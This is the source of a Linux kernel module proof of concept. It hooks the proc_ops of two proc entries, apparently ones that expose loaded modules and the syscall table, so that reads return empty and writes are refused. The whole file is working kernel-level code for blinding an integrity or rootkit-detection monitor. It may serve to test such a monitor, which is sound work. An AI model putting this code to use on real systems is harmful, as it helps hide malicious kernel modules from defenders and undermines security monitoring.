// SPDX-License-Identifier: GPL-2.0-only
/*
 * Copyright (C) 2026 dere3046
 */

#define POC_NAME "poc_proc_empty"
#define POC_DESC "inte poc empty readonly proc"

#include "poc_common.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("dere3046");
MODULE_DESCRIPTION(POC_DESC);

static void **slot_ko;
static void **slot_systbl;

static ssize_t empty_read(struct file *file, char __user *buf, size_t count,
			  loff_t *ppos)
{
	return 0;
}

static ssize_t deny_write(struct file *file, const char __user *buf,
			  size_t count, loff_t *ppos)
{
	return -EPERM;
}

static const struct proc_ops empty_ops = {
	.proc_read = empty_read,
	.proc_write = deny_write,
};

static int __init poc_init(void)
{
	void *orig;
	int ret;

	ret = poc_init_common();
	if (ret)
		return ret;
	if (poc_proc_ko_entry) {
		ret = poc_proc_slot(poc_proc_ko_entry, &slot_ko);
		if (ret) {
			poc_err("ko slot failed %d", ret);
			return ret;
		}
		ret = hk_ptr_hook(slot_ko, (void *)&empty_ops, &orig);
		if (ret)
			return ret;
	}
	if (poc_proc_syscall_table_entry) {
		ret = poc_proc_slot(poc_proc_syscall_table_entry, &slot_systbl);
		if (!ret)
			hk_ptr_hook(slot_systbl, (void *)&empty_ops, &orig);
	}
	poc_info("proc empty installed");
	return 0;
}

static void __exit poc_exit(void)
{
	if (slot_ko)
		hk_ptr_unhook(slot_ko);
	if (slot_systbl)
		hk_ptr_unhook(slot_systbl);
	poc_exit_common();
}

module_init(poc_init);
module_exit(poc_exit);
